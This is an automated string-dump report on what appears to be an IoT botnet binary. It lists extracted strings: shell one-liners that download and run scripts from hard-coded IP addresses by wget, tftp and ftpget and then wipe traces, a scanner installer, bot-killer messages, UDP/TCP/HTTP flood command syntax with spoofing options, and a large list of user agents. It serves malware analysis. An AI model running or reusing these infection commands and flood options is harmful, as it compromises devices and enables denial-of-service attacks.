=============================================================================
========	BINARY ID :f8a9d4ec1d6e8516a282e35af1f70e2274aa03d3==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :2961
SUPSCPECTED LINES COUNT :366
SUPSCPECTED STRINGS COUNT (DISTINCT) :30
SUPSCPECTED STRINGS WEIGHT :115
SUSPECT STRING SCORE : [115 / 150] 76%
USER AGENTS STRINGS COUNT :262
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :113
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
nopqrstuvw√ü
bin*
botnet
swatnet
fucknet
cracknet
weednet
gaynet
queernet
ballnet
unet
cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
telnet
/dev/netslink/
/usr/
/bin/sh
/proc/cpuinfo
PING
EXFailed opening raw socket.
Invalid flag "%s"
pkill -9 
pkill -9 "
AAAAAAAAnetcore
 cd /var/; rm -rf cuntysshd; wget http://64.137.253.50/cuntysshd || tftp -r cuntysshd -g 64.137.253.50; chmod 777 cuntysshd; ./cuntysshd; rm -rf cuntysshd
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)
Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/
BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)
zspider/0.9-dev http://feedback.redkolibri.com/
Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )
Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)
Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)
TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)
TheSuBot/0.2 (www.thesubot.de)
TheSuBot/0.1 (www.thesubot.de)
FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)
FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)
FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)
FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)
FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)
Mozilla/4.0 (compatible: FDSE robot)
findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)
Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0
Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)
msnbot/1.0 (+http://search.msn.com/msnbot.htm)
msnbot/0.9 (+http://search.msn.com/msnbot.htm)
msnbot/0.11 ( http://search.msn.com/msnbot.htm)
MSNBOT/0.1 (http://search.msn.com/msnbot.htm)
Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)
Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)
NetResearchServer/4.0(loopimprovements.com/robot.html)
NetResearchServer/3.5(loopimprovements.com/robot.html)
NetResearchServer/2.8(loopimprovements.com/robot.html)
NetResearchServer/2.7(loopimprovements.com/robot.html)
NetResearchServer/2.5(loopimprovements.com/robot.html)
Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)
Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET 
Googlebot/2.1 (http://www.googlebot.com/bot.html)
YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)
Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6
MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)
Gigabot/3.0 (http://www.gigablast.com/spider.html)
Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+
Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4
Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36
Rome Client (http://tinyurl.com/64t5n) Ver: 0.9
Googlebot 1.01.003
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)
Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13
Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3
Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1
Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60
Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3
Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25
Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)
Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)
Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)
HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)
Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620
Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)
Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22
Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36
Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c
sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py
INSTALLING PYTHON SCANNER
UPDATING PYTHON SCANNER
killall -9 python;pkill python
STOPPING PYTHON SCANNER
STARTING VOIDS HACKA SCANNA
SCANNER
STOPPING SCANNER
STARTING SCANNER ON -> %s
NETIS
STOPPING NETIS SCANNER
STARTING NETIS SCANNER
COMMENCING BOT KILL ON -> %s
UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>
TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)
HTTP
CNC <target> <port> <time>
STD <target> <port> <time>
KILLATTK
Killed %d.
None Killed.
/proc/net/route
/etc/rc.d/rc.local
fork failed\n
Connected %s:%s
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
?/bin/sh
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
/etc/config/hosts
fdopen_pids
libc/sysdeps/linux/powerpc/vfork.S
fork.c
getpid.c
kill.c
sigprocmask.c
waitpid.c
spec_flags.4074
strstr.c
_string_syserrmsgs.c
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname_r.c
connect.c
socket.c
rand.c
random.c
randtbl
random_r.c
random_poly_info
system.c
__socketcall.c
inet_aton.c
dnslookup.c
get_hosts_byname_r.c
inet_pton4
inet_ntop4
read_etc_hosts_r.c
__read_etc_hosts_r
__socketcall
waitpid
random
connect
GetRandomPublicIP
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
__libc_getpid
makeRandomStr
NetisScanner
sendHTTP
GetRandomIP
system
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
__GI_srandom_r
kill
__GI_sigprocmask
inet_addr
connectTimeout
__GI_kill
strstr
init_rand
rand
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__libc_system
UpdateBins
__get_hosts_byname_r
botkiller
__GI_inet_pton
gethostbyname
__vfork
knownBots
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_strstr
__GI_connect
inet_ntop
__GI_inet_aton
__GI_vfork
NetisRanges
__GI_inet_addr
__libc_connect
pids
sigprocmask
`\b·æê·êÄÁæÄÎ†ÄËÄ∏–ÄÎæÄ·êÄÏôåËà±H÷É8»Ä·æ∞·†Ä·æÄÏÄÄT„∏ÑÕºÁ†ÉHÎÜ≥ÊÅºÁ†õ·æ∞·®ÄÁæÅÎ∞Ä„ºπ·†Ä‡§∏–ÄÊçΩÁ°õ—ºÁ†ÉÔΩãÁß≤ÊÅºÁ†õËÄØ
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
Opera/6.04 (Windows XP; U) [en]
Opera/9.99 (X11; U; sk)
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)
